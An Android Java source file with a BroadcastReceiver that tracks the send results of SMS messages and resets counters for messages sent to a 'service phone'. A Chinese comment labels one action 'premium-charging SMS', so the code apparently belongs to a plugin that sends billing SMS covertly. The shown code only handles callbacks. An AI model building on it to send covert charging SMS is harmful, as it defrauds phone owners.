package com.xstd.plugin.receiver;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.text.TextUtils;
import com.xstd.plugin.config.PluginSettingManager;

/**
 * Created by michael on 14-2-7.
 */
public class SMSSentBRC extends BroadcastReceiver {

    public static final String SMS_LOCAL_SENT_ACTION = "com.xstd.sms.local.sent";

    public static final String SMS_MONKEY_SENT_ACTION = "com.xstd.sms.monkey.sent";

    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        String actionName = intent.getAction();
        if (TextUtils.isEmpty(actionName)) return;

        String error_reason = "unknown";
        if (SMS_LOCAL_SENT_ACTION.equals(actionName)) {
            PluginSettingManager.getInstance().init(context);
            //是手机服务器发送事件
            switch (getResultCode()) {
                case Activity.RESULT_OK:
                    //成功了就立刻返回
                    PluginSettingManager.getInstance().setLocalSMSSent(true);
                    return;
                case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                    error_reason = "normal_error";
                    break;
                case SmsManager.RESULT_ERROR_RADIO_OFF:
                    error_reason = "radio_off";
                    break;
                case SmsManager.RESULT_ERROR_NULL_PDU:
                    error_reason = "pdu_null";
                    break;
                case SmsManager.RESULT_ERROR_NO_SERVICE:
                    error_reason = "no_service";
                    break;
                default:
                    error_reason = "unknown";
            }

            //能到这的逻辑都是发送失败了
            PluginSettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
            PluginSettingManager.getInstance().setKeyLastSendMsgToServicePhone(0);
            PluginSettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
        } else if (SMS_MONKEY_SENT_ACTION.equals(actionName)) {
            //是扣费短信
        }
    }

}
